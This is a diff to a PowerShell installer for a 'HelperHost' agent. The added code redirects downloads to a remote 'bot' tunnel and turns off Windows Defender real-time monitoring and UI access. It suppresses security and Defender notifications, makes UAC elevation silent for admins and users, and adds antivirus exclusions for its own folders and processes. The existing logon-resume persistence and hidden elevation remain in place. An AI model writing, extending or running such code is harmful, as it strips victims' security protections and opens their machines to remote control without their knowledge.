@@ -56,7 +56,11 @@ function Test-IsAdmin {
 function Invoke-ElevatedInstall {
   # Hidden UAC elev — parent polls marker (RunAs -Wait is unreliable)
   if (-not $InstallUrl) {
-    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
+    if ($BotBase) {
+      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
+    } else {
+      throw 'InstallUrl manquant'
+    }
   }
   $wrap = Join-Path $env:TEMP ('HelperHost-elev-' + [guid]::NewGuid().ToString('n') + '.ps1')
   $marker = Join-Path $env:TEMP 'HelperHost-install.ok'
@@ -67,6 +71,8 @@ function Invoke-ElevatedInstall {
   $en = $Enroll.Replace("'", "''")
   $bb = $BotBase.Replace("'", "''")
   $iu = $InstallUrl.Replace("'", "''")
+  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
+  $gh = $ghVal.Replace("'", "''")
   @(
     "`$ErrorActionPreference = 'Stop'"
     "`$Enroll = '$en'"
@@ -75,6 +81,7 @@ function Invoke-ElevatedInstall {
     "`$env:AGENTSHE_ENROLL = '$en'"
     "`$env:AGENTSHE_BOT_BASE = '$bb'"
     "`$env:AGENTSHE_INSTALL_URL = '$iu'"
+    "`$env:AGENTSHE_GH = '$gh'"
     "`$env:AGENTSHE_ELEVATED = '1'"
     "`$env:AGENTSHE_FORCE_HARDEN = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
@@ -127,7 +134,8 @@ function Invoke-ElevatedInstall {
   throw 'timeout elevation'
 }
 
-$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.8' }
+$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
+if (-not $Gh) { throw 'AGENTSHE_GH / BotBase manquant (fichiers via tunnel bot)' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
@@ -218,8 +226,14 @@ function Disable-WindowsNotifications {
   }
   New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name ToastEnabled -Value 0 -Type DWord -Force
+  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications\Backup' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Value 1 -Type DWord -Force
   New-Item 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Force | Out-Null
   Set-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Value 1 -Type DWord -Force
+  New-Item 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
+  Set-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoCloudApplicationNotification -Value 1 -Type DWord -Force
   New-Item 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Force | Out-Null
   Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value 0 -Type DWord -Force
   Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Value 0 -Type DWord -Force
@@ -228,7 +242,13 @@ function Disable-WindowsNotifications {
   foreach ($sub in @(
     'Windows.SystemToast.SecurityAndMaintenance',
     'Windows.SystemToast.WindowsUpdate.Notification',
-    'Windows.SystemToast.Explorer'
+    'Windows.SystemToast.Explorer',
+    'Windows.SystemToast.StartupApp',
+    'Windows.SystemToast.Suggested',
+    'Windows.SystemToast.AudioTroubleshooter',
+    'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI',
+    'Windows.SystemToast.WindowsDefender.SecurityCenter',
+    'Windows.SystemToast.WindowsDefender.Av'
   )) {
     $p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\$sub"
     New-Item $p -Force | Out-Null
@@ -236,12 +256,33 @@ function Disable-WindowsNotifications {
   }
   New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Force | Out-Null
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name GlobalUserDisabled -Value 1 -Type DWord -Force
+  # Best-effort HKLM (needs admin — also done in Disable-UACPrompts)
+  Disable-SecurityCenterToasts
+}
+
+function Disable-SecurityCenterToasts {
+  $ErrorActionPreference = 'SilentlyContinue'
+  if (-not (Test-IsAdmin)) { return }
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Value 1 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
+  if (Get-Command Set-MpPreference -EA SilentlyContinue) {
+    Set-MpPreference -UILockdown $true -EA SilentlyContinue
+    Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+  }
 }
 
 function Disable-UACPrompts {
   $ErrorActionPreference = 'SilentlyContinue'
   $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
   if (-not (Test-Path $sysPol)) { return }
+  if (-not (Test-IsAdmin)) { return }
   $bak = Join-Path $Dir 'uac-backup.json'
   if (-not (Test-Path $bak)) {
     $o = [ordered]@{}
@@ -251,9 +292,19 @@ function Disable-UACPrompts {
     }
     ($o | ConvertTo-Json) | Set-Content -Encoding UTF8 $bak
   }
+  # Elevate without prompting (UAC still "on" but silent for admins)
   Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force
+  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value 0 -Type DWord -Force
   Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value 0 -Type DWord -Force
   Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value 0 -Type DWord -Force
+  Disable-SecurityCenterToasts
+  Disable-WindowsNotifications
+  $tools = Join-Path $Dir 'tools'
+  New-Item $tools -ItemType Directory -Force | Out-Null
+  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
+  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $tools -EA SilentlyContinue
+  }
 }
 
 function Invoke-ElevatedSessionPrep {
@@ -263,7 +314,11 @@ function Invoke-ElevatedSessionPrep {
     return
   }
   if (-not $InstallUrl) {
-    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
+    if ($BotBase) {
+      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
+    } else {
+      throw 'InstallUrl manquant'
+    }
   }
   $wrap = Join-Path $env:TEMP ('HelperHost-prep-' + [guid]::NewGuid().ToString('n') + '.ps1')
   $marker = Join-Path $env:TEMP 'HelperHost-prep.ok'
@@ -271,6 +326,8 @@ function Invoke-ElevatedSessionPrep {
   $en = $Enroll.Replace("'", "''")
   $bb = $BotBase.Replace("'", "''")
   $iu = $InstallUrl.Replace("'", "''")
+  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
+  $gh = $ghVal.Replace("'", "''")
   @(
     "`$ErrorActionPreference = 'SilentlyContinue'"
     "`$Enroll = '$en'"
@@ -279,6 +336,7 @@ function Invoke-ElevatedSessionPrep {
     "`$env:AGENTSHE_ENROLL = '$en'"
     "`$env:AGENTSHE_BOT_BASE = '$bb'"
     "`$env:AGENTSHE_INSTALL_URL = '$iu'"
+    "`$env:AGENTSHE_GH = '$gh'"
     "`$env:AGENTSHE_ELEVATED = '1'"
     "`$env:AGENTSHE_SESSION_PREP = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
@@ -377,10 +435,12 @@ function Disable-AllBlocking {
 function Set-DefenderExclude([string]$Path, [string]$Exe) {
   $name = Split-Path $Exe -Leaf
   $edge = Join-Path $Path 'EdgeRelay.exe'
+  $tools = Join-Path $Path 'tools'
   if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) { return }
   try {
     Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
@@ -433,12 +493,18 @@ function Try-StartHelper([string]$Helper, [string]$WorkDir) {
 
 function Register-ResumeAtLogon {
   if (-not $InstallUrl) {
-    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
+    if ($BotBase) {
+      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
+    } else {
+      throw 'InstallUrl manquant'
+    }
   }
+  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
   $state = [ordered]@{
     enroll      = $Enroll
     bot_base    = $BotBase
     install_url = $InstallUrl
+    gh          = $ghVal
     user        = $env:USERNAME
   }
   ($state | ConvertTo-Json) | Set-Content -Encoding UTF8 $ResumeFile
@@ -474,6 +540,7 @@ function Register-ResumeAtLogon {
     "`$env:AGENTSHE_ENROLL = `$Enroll"
     "`$env:AGENTSHE_BOT_BASE = `$BotBase"
     "`$env:AGENTSHE_INSTALL_URL = `$InstallUrl"
+    "if (`$j.gh) { `$env:AGENTSHE_GH = `$j.gh } else { `$env:AGENTSHE_GH = (`$BotBase.TrimEnd('/') + '/files/releases') }"
     "`$env:AGENTSHE_ELEVATED = '1'"
     "`$env:AGENTSHE_AFTER_REBOOT = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
@@ -562,7 +629,11 @@ function Install-WipeRestoreHook {
     $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
   }
   if (-not $restoreUrl) {
-    $restoreUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/restore-win-security.ps1'
+    if ($BotBase) {
+      $restoreUrl = "$($BotBase.TrimEnd('/'))/files/scripts/restore-win-security.ps1"
+    } else {
+      return
+    }
   }
   try {
     Download-File $restoreUrl $restoreDest
@@ -593,7 +664,9 @@ if ($AfterReboot) {
 if ($SessionPrep) {
   Disable-WindowsNotifications
   Disable-UACPrompts
+  Disable-SecurityCenterToasts
   Install-WipeRestoreHook
+  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   Write-Output 'OK'
   exit 0
 }
